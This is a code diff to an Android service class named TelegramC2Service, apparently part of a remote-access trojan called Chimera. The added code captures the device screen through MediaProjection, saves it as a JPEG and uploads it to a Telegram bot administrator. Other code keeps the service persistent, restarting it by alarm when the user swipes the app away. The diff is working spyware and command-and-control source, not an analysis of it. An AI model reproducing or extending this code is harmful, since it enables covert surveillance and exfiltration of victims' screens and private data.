@@ -1,5 +1,6 @@
 package com.chimera;
 
+import android.app.Activity;
 import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
@@ -8,12 +9,35 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.graphics.Bitmap;
+import android.graphics.PixelFormat;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
 import android.os.Build;
+import android.os.Handler;
+import android.os.HandlerThread;
 import android.os.IBinder;
+import android.util.DisplayMetrics;
+import android.view.WindowManager;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.nio.ByteBuffer;
 
 public class TelegramC2Service extends Service {
     private Thread workerThread;
     private static final String CHANNEL_ID = "chimeraChannel";
+
+    // Static fields for Screenshot functionality
+    private static MediaProjection mediaProjection;
+    private HandlerThread screenshotThread;
+    private Handler screenshotHandler;
+    private ImageReader imageReader;
+    private VirtualDisplay virtualDisplay;
 
     @Override
     public void onCreate() {
@@ -27,9 +51,16 @@ public class TelegramC2Service extends Service {
         startForeground(1, createNotification());
         try {
             startWorker();
+            setupScreenshotThread();
         } catch (Exception e) {
             ErrorLogger.logError(this, "TelegramC2Service_OnCreate", e);
         }
+    }
+
+    private void setupScreenshotThread() {
+        screenshotThread = new HandlerThread("Screenshot");
+        screenshotThread.start();
+        screenshotHandler = new Handler(screenshotThread.getLooper());
     }
 
     private void createNotifChannel() {
@@ -69,18 +100,84 @@ public class TelegramC2Service extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        try {
-            startWorker();
-        } catch (Exception e) {
-            ErrorLogger.logError(this, "TelegramC2Service_OnStart", e);
+        if (intent != null && "ACTION_SCREENSHOT_RESULT".equals(intent.getAction())) {
+            int resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED);
+            Intent resultData = intent.getParcelableExtra("resultData");
+            handleScreenshotResult(resultCode, resultData);
+        } else {
+            try {
+                startWorker();
+            } catch (Exception e) {
+                ErrorLogger.logError(this, "TelegramC2Service_OnStart", e);
+            }
         }
         return START_STICKY;
+    }
+
+    private void handleScreenshotResult(int resultCode, Intent data) {
+        MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        mediaProjection = projectionManager.getMediaProjection(resultCode, data);
+        if (mediaProjection != null) {
+            captureScreenshot();
+        }
+    }
+
+    private void captureScreenshot() {
+        WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+        DisplayMetrics metrics = new DisplayMetrics();
+        windowManager.getDefaultDisplay().getRealMetrics(metrics);
+        int width = metrics.widthPixels;
+        int height = metrics.heightPixels;
+        int density = metrics.densityDpi;
+
+        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+        virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture",
+                width, height, density,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                imageReader.getSurface(), null, screenshotHandler);
+
+        imageReader.setOnImageAvailableListener(reader -> {
+            Image image = null;
+            try {
+                image = reader.acquireLatestImage();
+                if (image != null) {
+                    Image.Plane[] planes = image.getPlanes();
+                    ByteBuffer buffer = planes[0].getBuffer();
+                    int pixelStride = planes[0].getPixelStride();
+                    int rowStride = planes[0].getRowStride();
+                    int rowPadding = rowStride - pixelStride * width;
+
+                    Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
+                    bitmap.copyPixelsFromBuffer(buffer);
+
+                    File outputFile = new File(getExternalFilesDir(null), "screenshot.jpg");
+                    try (FileOutputStream fos = new FileOutputStream(outputFile)) {
+                        bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
+                    }
+                    // Screenshot taken, now upload it
+                    TelegramBotWorker.uploadFile(outputFile.getAbsolutePath(), ConfigLoader.getAdminId(), "Screenshot", this);
+                    stopScreenshot();
+                }
+            } catch (Exception e) {
+                ErrorLogger.logError(this, "ScreenshotCapture", e);
+            } finally {
+                if (image != null) image.close();
+            }
+        }, screenshotHandler);
+    }
+
+    private void stopScreenshot() {
+        if (virtualDisplay != null) virtualDisplay.release();
+        if (imageReader != null) imageReader.close();
+        if (mediaProjection != null) mediaProjection.stop();
     }
 
     @Override
     public void onDestroy() {
         try {
             if (workerThread != null) workerThread.interrupt();
+            screenshotThread.quitSafely();
+            stopScreenshot();
         } catch (Exception e) {
             ErrorLogger.logError(this, "TelegramC2Service_OnDestroy", e);
         }
@@ -88,28 +185,16 @@ public class TelegramC2Service extends Service {
     }
 
     @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
+    public IBinder onBind(Intent intent) { return null; }
 
-    // ADDED: THIS METHOD IS CALLED WHEN THE USER SWIPES THE APP FROM RECENTS
     @Override
     public void onTaskRemoved(Intent rootIntent) {
         try {
-            // Schedule the service to restart
             Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
             restartServiceIntent.setPackage(getPackageName());
-
-            PendingIntent restartServicePendingIntent = PendingIntent.getService(
-                    getApplicationContext(),
-                    1000, // A unique request code
-                    restartServiceIntent,
-                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
-            );
-
+            PendingIntent restartServicePendingIntent = PendingIntent.getService(getApplicationContext(), 1000, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
             AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
             alarmService.set(AlarmManager.ELAPSED_REALTIME, System.currentTimeMillis() + 1000, restartServicePendingIntent);
-
         } catch (Exception e) {
             ErrorLogger.logError(this, "TelegramC2Service_OnTaskRemoved", e);
         }
